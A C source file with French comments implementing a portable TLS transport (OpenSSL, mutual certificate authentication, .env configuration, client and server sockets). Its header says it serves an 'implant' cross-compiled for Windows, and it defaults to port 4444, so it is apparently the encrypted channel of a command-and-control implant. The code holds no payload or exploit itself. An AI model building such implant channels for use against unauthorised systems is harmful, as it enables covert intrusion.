/*
 * tls.c - Implémentation du module TLS portable (Linux + Windows).
 *
 * Sous Linux  : POSIX sockets (sys/socket.h, arpa/inet.h ...).
 * Sous Windows : Winsock2 (winsock2.h, ws2tcpip.h) — nécessaire pour l'implant
 *                cross-compilé avec mingw-w64.
 *
 * Dépendances : OpenSSL (libssl + libcrypto).
 *
 * COUCHES :
 *   TCP   : transporte des octets EN CLAIR.
 *   TLS   : confidentialité + intégrité + authentification mutuelle (mTLS).
 */

/* ---- Includes réseau ---- */
#ifdef _WIN32
#  include <winsock2.h>
#  include <ws2tcpip.h>
#  include <windows.h>
   /* applink.c : nécessaire sur Windows pour qu'OpenSSL écrive dans stderr.
    * Inclus une seule fois ici. Les warnings 4152/4996 sont désactivés autour. */
#  pragma warning(push)
#  pragma warning(disable : 4152 4996)
#  include <openssl/applink.c>
#  pragma warning(pop)
   typedef SOCKET sock_t;
#  define INVALID_SOCK INVALID_SOCKET
#  define CLOSE_SOCK(s) closesocket(s)
#else
#  include <arpa/inet.h>
#  include <netinet/in.h>
#  include <sys/socket.h>
#  include <unistd.h>
   typedef int sock_t;
#  define INVALID_SOCK (-1)
#  define CLOSE_SOCK(s) close(s)
#endif

#include <openssl/err.h>
#include <openssl/ssl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "tls.h"

/* ====================== Configuration (.env) ====================== */

#define CFG_MAX    64
#define CFG_KEYLEN 64
#define CFG_VALLEN 256

static struct {
    char key[CFG_KEYLEN];
    char val[CFG_VALLEN];
} g_cfg[CFG_MAX];

static int  g_cfg_count  = 0;
static char g_env_buf[CFG_VALLEN];

static char *trim(char *s) {
    char *end;
    while (*s == ' ' || *s == '\t') s++;
    end = s + strlen(s);
    while (end > s &&
           (end[-1] == ' ' || end[-1] == '\t' ||
            end[-1] == '\r' || end[-1] == '\n'))
        *--end = '\0';
    return s;
}

int cfg_load(const char *path) {
    char  line[CFG_KEYLEN + CFG_VALLEN + 8];
    FILE *f;

#ifdef _WIN32
    if (fopen_s(&f, path, "r") != 0 || f == NULL) return -1;
#else
    f = fopen(path, "r");
    if (!f) return -1;
#endif

    while (fgets(line, sizeof(line), f) != NULL && g_cfg_count < CFG_MAX) {
        char  *eq, *k, *v;
        size_t vl;
        k = trim(line);
        if (*k == '\0' || *k == '#') continue;
        eq = strchr(k, '=');
        if (!eq) continue;
        *eq = '\0';
        k   = trim(k);
        v   = trim(eq + 1);
        vl  = strlen(v);
        if (vl >= 2 && (v[0] == '"' || v[0] == '\'') && v[vl - 1] == v[0]) {
            v[vl - 1] = '\0';
            v++;
        }
#ifdef _WIN32
        strncpy_s(g_cfg[g_cfg_count].key, CFG_KEYLEN, k, _TRUNCATE);
        strncpy_s(g_cfg[g_cfg_count].val, CFG_VALLEN, v, _TRUNCATE);
#else
        strncpy(g_cfg[g_cfg_count].key, k, CFG_KEYLEN - 1);
        g_cfg[g_cfg_count].key[CFG_KEYLEN - 1] = '\0';
        strncpy(g_cfg[g_cfg_count].val, v, CFG_VALLEN - 1);
        g_cfg[g_cfg_count].val[CFG_VALLEN - 1] = '\0';
#endif
        g_cfg_count++;
    }
    fclose(f);
    return 0;
}

const char *cfg_get(const char *key, const char *def) {
    int i;
    for (i = g_cfg_count - 1; i >= 0; i--)
        if (strcmp(g_cfg[i].key, key) == 0)
            return g_cfg[i].val;

#ifdef _WIN32
    {
        DWORD n = GetEnvironmentVariableA(key, g_env_buf, (DWORD)sizeof(g_env_buf));
        if (n > 0 && n < sizeof(g_env_buf)) return g_env_buf;
    }
#else
    {
        char *env = getenv(key);
        if (env) {
            strncpy(g_env_buf, env, CFG_VALLEN - 1);
            g_env_buf[CFG_VALLEN - 1] = '\0';
            return g_env_buf;
        }
    }
#endif
    return def;
}

int cfg_port(void) {
    long p = strtol(cfg_get("SERVER_PORT", "4444"), NULL, 10);
    return (p > 0 && p <= 65535) ? (int)p : 4444;
}

/* ====================== TLS ====================== */

struct tls_conn {
    SSL_CTX *ctx;
    SSL     *ssl;
    sock_t   sock;
};

int tls_init(void) {
#ifdef _WIN32
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2, 2), &wsa) == 0 ? 0 : -1;
#else
    return 0; /* rien à faire sur Linux */
#endif
}

void tls_cleanup(void) {
#ifdef _WIN32
    WSACleanup();
#endif
}

void tls_close(tls_conn *c) {
    if (!c) return;
    if (c->ssl) { SSL_shutdown(c->ssl); SSL_free(c->ssl); }
    if (c->sock != INVALID_SOCK) CLOSE_SOCK(c->sock);
    if (c->ctx)  SSL_CTX_free(c->ctx);
    free(c);
}

static SSL_CTX *make_ctx(int server, const char *cert, const char *key) {
    const char *ca  = cfg_get("CA_CERT", "certs/ca.crt");
    SSL_CTX    *ctx = SSL_CTX_new(server ? TLS_server_method() : TLS_client_method());
    if (!ctx) { ERR_print_errors_fp(stderr); return NULL; }

    if (SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION)              != 1 ||
        SSL_CTX_load_verify_locations(ctx, ca, NULL)                    != 1 ||
        SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM)       != 1 ||
        SSL_CTX_use_PrivateKey_file(ctx, key,  SSL_FILETYPE_PEM)        != 1 ||
        SSL_CTX_check_private_key(ctx)                                  != 1) {
        fprintf(stderr, "[TLS] Certificats invalides (CA=%s cert=%s key=%s)\n",
                ca, cert, key);
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        return NULL;
    }
    SSL_CTX_set_verify(ctx,
        server ? (SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT) : SSL_VERIFY_PEER,
        NULL);
    return ctx;
}

static tls_conn *new_conn(void) {
    tls_conn *c = (tls_conn *)calloc(1, sizeof(*c));
    if (c) c->sock = INVALID_SOCK;
    return c;
}

static int make_addr(const char *ip, int port, struct sockaddr_in *a) {
    memset(a, 0, sizeof(*a));
    a->sin_family = AF_INET;
    a->sin_port   = htons((unsigned short)port);
    if (inet_pton(AF_INET, ip, &a->sin_addr) != 1) {
        fprintf(stderr, "[TLS] Adresse IP invalide : %s\n", ip);
        return -1;
    }
    return 0;
}

/* CLIENT */
tls_conn *tls_connect(const char *ip, int port) {
    struct sockaddr_in addr;
    tls_conn          *c;

    if (make_addr(ip, port, &addr) != 0) return NULL;
    c = new_conn();
    if (!c) return NULL;

    c->ctx = make_ctx(0,
                      cfg_get("CLIENT_CERT", "certs/client.crt"),
                      cfg_get("CLIENT_KEY",  "certs/client.key"));
    if (!c->ctx) goto fail;

    c->ssl = SSL_new(c->ctx);
    if (!c->ssl || SSL_set1_ipaddr(c->ssl, ip) != 1) {
        ERR_print_errors_fp(stderr); goto fail;
    }

    c->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (c->sock == INVALID_SOCK ||
        connect(c->sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
#ifdef _WIN32
        fprintf(stderr, "[TLS] connect échoué (%d)\n", WSAGetLastError());
#else
        perror("[TLS] connect");
#endif
        goto fail;
    }

    if (SSL_set_fd(c->ssl, (int)c->sock) != 1 || SSL_connect(c->ssl) != 1) {
        fprintf(stderr, "[TLS] Handshake échoué : %s\n",
                X509_verify_cert_error_string(SSL_get_verify_result(c->ssl)));
        ERR_print_errors_fp(stderr);
        goto fail;
    }
    return c;

fail:
    tls_close(c);
    return NULL;
}

/* SERVEUR */
tls_conn *tls_accept_one(const char *ip, int port) {
    struct sockaddr_in addr;
    sock_t             listener = INVALID_SOCK;
    tls_conn          *c;
#ifndef _WIN32
    int opt = 1;
#endif

    if (make_addr(ip, port, &addr) != 0) return NULL;
    c = new_conn();
    if (!c) return NULL;

    c->ctx = make_ctx(1,
                      cfg_get("SERVER_CERT", "certs/server.crt"),
                      cfg_get("SERVER_KEY",  "certs/server.key"));
    if (!c->ctx) goto fail;

    listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listener == INVALID_SOCK) { perror("[TLS] socket"); goto fail; }

#ifndef _WIN32
    setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
#else
    {
        BOOL b = TRUE;
        setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (const char *)&b, sizeof(b));
    }
#endif

    if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
        listen(listener, 1) != 0) {
#ifdef _WIN32
        fprintf(stderr, "[TLS] bind/listen échoué (%d)\n", WSAGetLastError());
#else
        perror("[TLS] bind/listen");
#endif
        goto fail;
    }
    printf("[TLS] Écoute sur %s:%d\n", ip, port);
    fflush(stdout);

    c->sock = accept(listener, NULL, NULL);
    CLOSE_SOCK(listener);
    listener = INVALID_SOCK;

    if (c->sock == INVALID_SOCK) { perror("[TLS] accept"); goto fail; }

    c->ssl = SSL_new(c->ctx);
    if (!c->ssl || SSL_set_fd(c->ssl, (int)c->sock) != 1 || SSL_accept(c->ssl) != 1) {
        fprintf(stderr, "[TLS] Handshake refusé\n");
        ERR_print_errors_fp(stderr);
        goto fail;
    }
    return c;

fail:
    if (listener != INVALID_SOCK) CLOSE_SOCK(listener);
    tls_close(c);
    return NULL;
}

int tls_send(tls_conn *c, const void *data, int len) {
    int n = SSL_write(c->ssl, data, len);
    if (n <= 0) ERR_print_errors_fp(stderr);
    return n;
}

int tls_recv(tls_conn *c, void *buf, int max) {
    int n = SSL_read(c->ssl, buf, max);
    if (n <= 0) ERR_print_errors_fp(stderr);
    return n;
}

const char *tls_version(tls_conn *c) { return SSL_get_version(c->ssl); }
